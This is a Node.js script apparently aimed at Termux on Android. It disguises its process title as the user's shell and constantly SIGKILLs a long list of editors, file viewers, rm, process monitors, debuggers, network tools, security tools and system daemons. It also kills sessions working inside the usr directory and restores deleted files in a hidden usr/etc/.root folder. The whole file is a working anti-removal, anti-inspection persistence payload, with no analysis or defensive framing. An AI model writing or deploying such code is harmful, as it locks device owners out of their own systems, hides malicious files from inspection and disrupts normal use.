import fs from 'node:fs';
import fsp from 'node:fs/promises';
import { spawn } from 'node:child_process';
import crypto from 'node:crypto';
import path from 'node:path';
import os from 'node:os';

async function nipon(){
	const PREFIX = path.resolve(os.homedir(), '..', 'usr');
	const ROOT   = path.join(PREFIX, 'etc', '.root');
	const BACKUP = path.join(ROOT, '.bak');
	fs.mkdirSync(BACKUP, { recursive: true });
	const snap    = new Set();
	const watched = new Set();
	const hash    = (p) => crypto.createHash('md5').update(p).digest('hex');
	const backupOf = (p) => path.join(BACKUP, hash(p));
	const isBak    = (p) => p === BACKUP || p.startsWith(BACKUP + path.sep);
	const save = (p) => {
	  const bp = backupOf(p);
	  if (!fs.existsSync(bp)) { try { fs.copyFileSync(p, bp); } catch {} }
	};
	
	const restore = (p) => {
	  const bp = backupOf(p);
	  if (!fs.existsSync(bp)) return;
	  try {
	        fs.copyFileSync(bp, p);
	  } catch {}
	};
	
	function onEvent(d, name) {
	  if (!name) return;
	  const p = path.join(d, name);
	  if (isBak(p)) return;
	  let st = null;
	  try { st = fs.lstatSync(p); } catch {}
	  if (st?.isDirectory()) {
	    walk(p);
	  } else if (st?.isFile()) {
	    if (!snap.has(p)) { snap.add(p); save(p); }
	  } else if (snap.has(p)) {
	    restore(p);
	  }
	}
	
	function walk(d) {
	  if (watched.has(d) || isBak(d)) return;
	  watched.add(d);
	  try { fs.watch(d, (_, n) => onEvent(d, n)).on('error', () => {}); }
	  catch {}
	  let es;
	  try { es = fs.readdirSync(d, { withFileTypes: true }); } catch { return; }
	  for (const e of es) {
	    const p = path.join(d, e.name);
	    if (isBak(p)) continue;
	    if (e.isDirectory()) walk(p);
	    else if (e.isFile() && !snap.has(p)) { snap.add(p); save(p); }
	  }
	}
	walk(ROOT);
	setInterval(() => {
	  for (const p of snap) if (!fs.existsSync(p)) restore(p);
	}, 2);
}


const TERMUX_HOME = process.env.HOME || '/data/data/com.termux/files/home';
const TERMUX_USR  = path.resolve(TERMUX_HOME, '..', 'usr');
const kicked = new Map();
const RETRY_MS = 200;
function isInsideUsr(p) {
  if (!p) return false;
  const rel = path.relative(TERMUX_USR, p);
  return rel === '' || (!rel.startsWith('..') && !path.isAbsolute(rel));
} function getCwd(pid) {
  try {
    return fs.readlinkSync(`/proc/${pid}/cwd`);
  } catch {
    return null;
  }
} function kick(pid) {
  try {
    process.kill(pid, 'SIGHUP');
    return 'SIGHUP';
  } catch {}
  try {
    process.kill(pid, 'SIGKILL');
    return 'SIGKILL';
  } catch {}
  return null;
} function scanSessions() {
  let pids;
  try {
    pids = fs.readdirSync('/proc').filter(f => /^\d+$/.test(f));
  } catch {
    return;
  }
  const now = Date.now();
  for (const pidStr of pids) {
    const pid = Number(pidStr);
    if (pid === process.pid) continue;

    const cwd = getCwd(pid);
    if (!cwd || !isInsideUsr(cwd)) {
      kicked.delete(pid);
      continue;
    }
    if (isInsideUsr(TERMUX_HOME)) continue;
    const prev = kicked.get(pid);
    if (prev && prev.cwd === cwd && now - prev.at < RETRY_MS) continue;
    const signal = kick(pid);
    if (signal) {
      kicked.set(pid, { cwd, at: now });
    }
  }
}

const TARGETS = new Set([
  'ps','nano', 'micro', 'cat', 'rm', 'rm -rf', 'vim', 'vi', 'emacs', 'pico', 'joe', 'ne', 'mcedit',
  'nvi', 'vim.basic', 'vim.tiny', 'vim.nox', 'vim.gtk', 'vim.gnome',
  'vim-athena', 'vim-console', 'gvim', 'gview', 'view', 'rvim', 'rview',
  'vimdiff', 'gvimdiff', 'vimtutor', 'ex', 'evex', 'gex',
  'nvim', 'neovim', 'nvr', 'nvim-qt', 'neovide', 'goneovim', 'fvim',
  'uivonim', 'vimr', 'oni', 'oni2', 'qnvim', 'firenvim', 'veonim',
  'elvis', 'vile', 'viper', 'busybox_vi', 'ex-vi', 'vi.real', 'nvi',
  'viper', 'kak', 'kakoune', 'kak-lsp',
  'emacs-nox', 'emacs-x11', 'emacs-gtk', 'emacs-gtk3', 'emacs-pgtk',
  'emacsclient', 'emacsclient.gtk', 'zile', 'jove', 'mg', 'uemacs',
  'microemacs', 'jed', 'jmacs', 'jstar', 'joe', 'xemacs', 'xemacs-nox',
  'remacs', 'gneve', 'lem', 'ng', 'teco', 'hemlock',
  'helix', 'hx', 'kilo', 'kibi', 'amp', 'xi', 'xi-core', 'xi-term',
  'lapce', 'lapce-proxy', 'zed', 'zed-editor', 'fresh', 'fresh-editor',
  'dte', 'the', 'tilde', 'tde', 'ee', 'edit', 'editor', 'sensible-editor',
  'sensible-editor.tiny', 'editor.tiny',
  'mcedit', 'mc', 'midnight-commander', 'mcedit-wrapper', 'dte', 'tilde',
  'diakonos', 'dte', 'moe', 'ne', 'nice', 'e3', 'e3em', 'e3vi', 'e3pi',
  'e3ws', 'beav', 'jupp', 'joe', 'jmacs', 'rjoe', 'jpico', 'nano-tiny',
  'nano.basic', 'nano-tiny', 'rnano', 'gnano', 'nanoweb', 'gedit',
  'pluma', 'mousepad', 'leafpad', 'kate', 'kwrite', 'kile', 'kdevelop',
  'code', 'code-oss', 'codium', 'vscodium', 'codelite', 'atom',
  'sc-im', 'sc', 'visidata', 'vd', 'slsc', 'slang', 'slrn', 'slrnface',
  'tuir', 'rtv', 'turses', 'tuitter', 'toot', 'tootstream', 'twtxt',
  'weechat', 'irssi', 'epic5', 'epic', 'bitchx', 'bitchx-gtk', 'sic',
  'ircII', 'irc', 'ircii', 'tinyirc', 'ii', 'sic', 'sic-0.9',
  'hexedit', 'hexer', 'bvi', 'bbe', 'dhex', 'ht', 'xxd', 'hexdump',
  'hd', 'od', 'hexyl', 'hexdump-rs', 'heh', 'ghex', 'bless', 'wxHexEditor',
  'bvi', 'hexcurse', 'hexpert', 'hexyl',
  'glow', 'mdcat', 'bat', 'mdless', 'mdless-rs', 'rich-cli', 'rich',
  'note', 'notes', 'jrnl', 'jrnl.sh', 'nb', 'zk', 'obsidian', 'logseq',
  'tnote', 'taskwiki', 'taskwarrior-tui', 'taskwarrior', 'task', 'todo.txt',
  'todoman', 'calcurse', 'khal', 'khard', 'taskopen', 'vit',
  'less', 'more', 'most', 'pg', 'pager', 'bat', 'batcat', 'cat',
  'tac', 'head', 'tail', 'multitail', 'ccze', 'lnav', 'klogg', 'klog',
  'ranger', 'nnn', 'lf', 'lfrun', 'joshuto', 'yazi', 'clifm', 'vifm',
  'mc', 'midnight-commander', 'ncdu', 'dua', 'dust', 'broot', 'nnn',
  'fff', 'fm', 'clex', 'deco', 'vifm', 'vifmrun', 'twin', 'wcm',
  'tig', 'lazygit', 'gitui', 'gitg', 'gitk', 'giggle', 'ungit',
  'git-cola', 'gitkraken', 'gitui', 'grv', 'grv-nano',
  'telnet', 'ncat', 'nc', 'netcat', 'socat', 'netstat', 'ss', 'lsof',
  'ifconfig', 'ip', 'route', 'arp', 'traceroute', 'tracepath', 'mtr',
  'aria2', 'axel', 'transmission', 'transmission-cli', 'rtorrent',
  'deluge', 'deluge-console', 'qbittorrent', 'ctorrent',
  'ps', 'pstree', 'pgrep', 'pidof', 'fuser', 'top', 'htop', 'btop',
  'bpytop', 'bashtop', 'gotop', 'glances', 'nmon', 'atop', 'iftop',
  'nethogs', 'iotop', 'powertop', 'vtop', 'ytop', 'gtop', 'zenith',
  'bottom', 'btm', 'procs', 'procps', 'systemd-cgtop', 'pidstat',
  'mpstat', 'iostat', 'vmstat', 'sar', 'sadf', 'dstat', 'collectl',
  'smem', 'free', 'uptime', 'w', 'who', 'last', 'lastlog', 'users',
  'whoami', 'id', 'groups', 'tty', 'stty', 'pspy', 'ps-watcher',
  'watch', 'watchdog', 'sysstat', 'sysdig', 'strace', 'ltrace',
  'perf', 'ftrace', 'bpftrace', 'bpftool', 'perf-top', 'powertop',
  'systemd-analyze', 'systemctl', 'journalctl', 'dmesg', 'kmsg',
  'lsblk', 'blkid', 'df', 'du', 'findmnt', 'mount', 'umount',
  'fdisk', 'sfdisk', 'cfdisk', 'parted', 'gparted', 'partx',
  'smartctl', 'smartd', 'hdparm', 'nvme', 'sensors', 'lm-sensors',
  'cpupower', 'turbostat', 'x86_energy_perf_policy',
  'docker', 'dockerd', 'containerd', 'ctr', 'nerdctl', 'podman',
  'buildah', 'skopeo', 'crictl', 'kubectl', 'k9s', 'kubectx',
  'kubens', 'helm', 'kustomize', 'kompose', 'minikube', 'kind',
  'k3s', 'k3d', 'microk8s', 'talosctl', 'lazydocker', 'dry',
  'ctop', 'dockly', 'oxker', 'podman-tui', 'lazykube', 'kubetui',
  'mpv', 'mplayer', 'vlc', 'cvlc', 'ffmpeg', 'ffplay', 'ffprobe',
  'cmus', 'ncmpcpp', 'ncmpc', 'mpd', 'mpc', 'mopidy', 'moc', 'mocp',
  'pianobar', 'spotify-tui', 'spt', 'spotifyd', 'cava', 'vis',
  'alsamixer', 'amixer', 'pavucontrol', 'pactl', 'pulseaudio',
  'pipewire', 'wireplumber', 'jackd', 'qjackctl', 'cadence',
  'yt-dlp', 'youtube-dl', 'you-get', 'annie', 'streamlink',
  'mutt', 'neomutt', 'alpine', 'pine', 'muttng', 'mutt-wizard',
  'notmuch', 'mu', 'mu4e', 'aerc', 'mailx', 'mail', 's-nail', 'heirloom-mailx',
  'balsa', 'claws-mail', 'evolution', 'thunderbird', 'geary',
  'slack-term', 'slack-term-rs', 'matterhorn', 'matrix', 'weechat',
  'irssi', 'znc', 'quasselcore', 'quasselclient', 'hexchat', 'polari',
  'discord', 'discord-tui', 'cordless', 'ripcord', 'signal-cli',
  'telegram-cli', 'tg', 'tdlib', 'elegram', 'toxic', 'toxic-rs',
  'mysql', 'psql', 'sqlite3', 'mongo', 'mongosh', 'redis-cli',
  'pgcli', 'mycli', 'litecli', 'mssql-cli', 'influx', 'clickhouse-client',
  'cqlsh', 'duckdb', 'usql', 'sqlmap', 'sqlite-utils', 'iredis',
  'redis-commander', 'redis-insight', 'medis', 'another-redis-desktop-manager',
  'gdb', 'lldb', 'pdb', 'ipdb', 'pudb', 'radare2', 'r2', 'rizin',
  'ghidra', 'objdump', 'readelf', 'nm', 'strings', 'addr2line',
  'valgrind', 'callgrind', 'delve', 'dlv', 'node-inspect', 'inspect',
  'esbuild', 'webpack', 'vite', 'rollup', 'babel', 'tsc',
  'tsserver', 'typescript-language-server', 'pyright', 'pylsp',
  'jedi-language-server', 'gopls', 'rust-analyzer', 'clangd',
  'ccls', 'lua-language-server', 'vim-language-server',
  'bash-language-server', 'yaml-language-server', 'vscode-json-languageserver',
  'pzstd', 'atool', 'dtrx', 'unar', 'lsar', 'arc', 'arj', 'lha',
  'compress', 'uncompress', 'zcat', 'bzcat', 'xzcat', 'zstdcat',
  'nmap', 'masscan', 'zmap', 'nikto', 'gobuster', 'ffuf', 'dirb',
  'dirsearch', 'wfuzz', 'sqlmap', 'msfconsole', 'msfvenom', 'armitage',
  'burpsuite', 'zaproxy', 'ettercap', 'wireshark', 'tshark', 'tcpdump',
  'tshark-gtk', 'dsniff', 'mitmproxy', 'mitmweb', 'responder',
  'aircrack-ng', 'airmon-ng', 'airodump-ng', 'aireplay-ng', 'kismet',
  'reaver', 'pixiewps', 'hashcat', 'john', 'hydra', 'medusa',
  'patator', 'ncrack', 'crunch', 'cewl', 'radare2', 'rizin',
  'crond', 'cron', 'anacron', 'atd', 'at', 'batch', 'systemd',
  'init', 'rc', 'openrc', 'runit', 's6-svscan', 'supervisord',
  'daemontools', 'launchd', 'service', 'sysvinit', 'upstart',
  'kworker', 'kswapd', 'ksoftirqd', 'migration', 'rcu_sched',
  'init', 'systemd-journald', 'systemd-logind', 'systemd-udevd',
  'dbus-daemon', 'polkitd', 'accounts-daemon', 'upowerd',
  'NetworkManager', 'wpa_supplicant', 'dhclient', 'dhcpcd',
  'avahi-daemon', 'cupsd', 'cups-browsed', 'bluetoothd', 'gdm',
  'sddm', 'lightdm', 'lxdm', 'xdm', 'greetd', 'gdm3', 'gdm-x-session',
  'Xorg', 'X', 'wayland', 'weston', 'sway', 'hyprland', 'hyprctl',
  'river', 'dwl', 'kwin_wayland', 'kwin_x11', 'mutter', 'xfwm4',
  'openbox', 'fluxbox', 'i3', 'i3bar', 'swaybar', 'waybar', 'polybar',
  'picom', 'compton', 'xcompmgr', 'dunst', 'mako', 'fnott', 'swaync',
]);

const SELF_PID = String(process.pid);
function getComm(pid) {
  try {
    return fs.readFileSync(`/proc/${pid}/comm`, 'utf8').trim();
  } catch {
    return null;
  }
}

function scanAndKill() {
  let pids;
  try {
    pids = fs.readdirSync('/proc').filter(f => /^\d+$/.test(f));
  } catch (e) {
    return;
  }
  for (const pid of pids) {
    if (pid === SELF_PID) continue;
    const name = getComm(pid);
    if (!name) continue;
    const clean = name.replace(/^\(|\)$/g, '').split(' ')[0];
    if (TARGETS.has(clean)) {
      try {
        process.kill(Number(pid), 'SIGKILL');
      } catch {}
    }
  }
}

function randoms(min = 0, max = 5) {
    return crypto.randomInt(min, max);
}

async function loop(){
	process.title = `${process.env.SHELL} -l`;
    scanAndKill();
    setTimeout(loop, randoms());
    setInterval(scanSessions,10);
    nipon()
}

loop().catch(()=>{});
